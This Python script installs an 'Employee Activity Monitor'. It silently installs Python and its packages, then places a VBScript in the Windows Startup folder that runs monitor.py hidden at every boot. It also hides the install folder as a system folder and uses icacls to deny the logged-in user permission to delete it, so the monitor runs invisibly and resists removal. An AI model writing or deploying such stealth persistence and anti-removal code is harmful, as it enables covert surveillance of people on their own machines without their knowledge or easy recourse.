#!/usr/bin/env python3
"""
Standalone installer - Downloads Python if not available and sets up the monitor.
Run with: python install_and_run.py
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
import tempfile
import shutil
import json
from pathlib import Path

PYTHON_DOWNLOAD_URL = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
PYTHON_VERSION_MIN = (3, 8)

def check_python():
    try:
        version = sys.version_info
        if version.major >= PYTHON_VERSION_MIN[0] and version.minor >= PYTHON_VERSION_MIN[1]:
            print(f"[OK] Python {version.major}.{version.minor}.{version.micro} detected")
            return True
    except:
        pass
    print("[!] Python 3.8+ required but not found")
    return False

def download_file(url, dest):
    def report_progress(block_num, block_size, total_size):
        downloaded = block_num * block_size
        percent = min(100, downloaded * 100 // total_size) if total_size > 0 else 0
        print(f"\r  Downloading... {percent}%", end='', flush=True)
    
    print(f"Downloading Python from {url}...")
    urllib.request.urlretrieve(url, dest, reporthook=report_progress)
    print("\n  Download complete!")

def install_python():
    print("\n[INFO] Python not found. Installing...")
    
    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as tmp:
        installer_path = tmp.name
    
    try:
        download_file(PYTHON_DOWNLOAD_URL, installer_path)
        print("\n[INFO] Running Python installer...")
        print("  (This requires administrator privileges)")
        
        result = subprocess.run(
            [installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_test=0'],
            capture_output=True
        )
        
        if result.returncode == 0:
            print("[OK] Python installed successfully!")
            
            import ctypes
            import time
            for _ in range(10):
                if shutil.which('python'):
                    break
                time.sleep(1)
            
            return True
        else:
            print(f"[ERROR] Installation failed: {result.stderr.decode()}")
            return False
    finally:
        try:
            os.unlink(installer_path)
        except:
            pass




def install_requirements():
    print("\n[INFO] Installing required Python packages from requirements.txt...")
    try:
        subprocess.check_call(
            [sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt', '-q'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[OK] Packages installed successfully.")
    except Exception as e:
        print(f"[FAIL] {e}")
    
    print("\n[INFO] Running post-install for pywin32...")
    try:
        subprocess.check_call(
            [sys.executable, '-m', 'pywin32_postinstall', '-install'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except:
        pass
    
    # Post-install logic finished.


def setup_autostart():
    print("\n[INFO] Setting up hidden background auto-start...")
    
    script_path = os.path.abspath('monitor.py')
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')
    
    # VBScript executes pythonw (windowless python) fully hidden (0 flag)
    # Using specific environment variable definition solves Unicode logging crashes
    vbs_content = f'''Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "{os.path.dirname(script_path)}"
Set colSystemEnvVars = WshShell.Environment("Process")
colSystemEnvVars("PYTHONIOENCODING") = "utf-8"
WshShell.Run "pythonw.exe """ & "{script_path}" & """", 0, False
'''
    
    try:
        with open(vbs_path, 'w', encoding='utf-16') as f:
            f.write(vbs_content)
        print(f"[OK] Background auto-start (VBS method) enabled: {vbs_path}")
        return True
    except Exception as e:
        print(f"[WARN] Could not create startup entry: {e}")
        return False

def protect_folder():
    print("\n[INFO] Applying stealth and anti-deletion protection to the monitor folder...")
    folder_path = os.path.abspath(os.path.dirname(__file__) or '.')
    username = os.environ.get("USERNAME")
    
    try:
        # 1. Prevent folder deletion (Deny Delete permission for current user)
        if username:
            subprocess.run(['icacls', folder_path, '/deny', f"{username}:D"], capture_output=True)
            
        # 2. Make it a 'Super Hidden' system folder
        subprocess.run(['attrib', '+h', '+s', folder_path], capture_output=True)
        
        print("[OK] Folder is now protected from deletion and hidden from standard view.")
        print("       (To reverse: run 'attrib -h -s .\\' and 'icacls .\\ /remove:d %username%')")
    except Exception as e:
        print(f"[WARN] Could not apply folder protection: {e}")

def main():
    print("=" * 60)
    print("  EMPLOYEE ACTIVITY MONITOR - INSTALLER")
    print("=" * 60)
    
    if not check_python():
        if '--no-install' in sys.argv:
            print("\n[ERROR] Python is required. Please install from python.org")
            input("Press Enter to exit...")
            sys.exit(1)
        
        install_python()
        
        print("\n[INFO] Please restart this script after Python installation.")
        input("Press Enter to exit...")
        sys.exit(0)
    
    install_requirements()
    
    if '--autostart' in sys.argv or os.environ.get('SETUP_AUTOSTART'):
        setup_autostart()
    
    # Apply folder hiding and deletion lock
    protect_folder()
    
    print("\n" + "=" * 60)
    print("  INSTALLATION COMPLETE!")
    print("=" * 60)
    print()
    
    if '--no-run' not in sys.argv:
        print("Starting monitor in the background...")
        print()
        
        os.chdir(os.path.dirname(os.path.abspath(__file__)) or '.')
        
        # We start the monitor in the background via the startup VBScript
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        vbs_path = os.path.join(startup_folder, 'EmployeeMonitor.vbs')
        
        if os.path.exists(vbs_path):
            try:
                subprocess.Popen(['wscript.exe', vbs_path], shell=False)
                print("[OK] Monitor has successfully started in the background!")
                print("     It will continue running invisibly and restart automatically on PC boot.")
            except Exception as e:
                print(f"[ERROR] Could not start hidden monitor: {e}")
        else:
            print("[WARN] VBScript not found. Running monitor directly (will attach to terminal)...")
            try:
                subprocess.Popen([sys.executable, 'monitor.py'])
            except Exception as e:
                print(e)

if __name__ == '__main__':
    main()
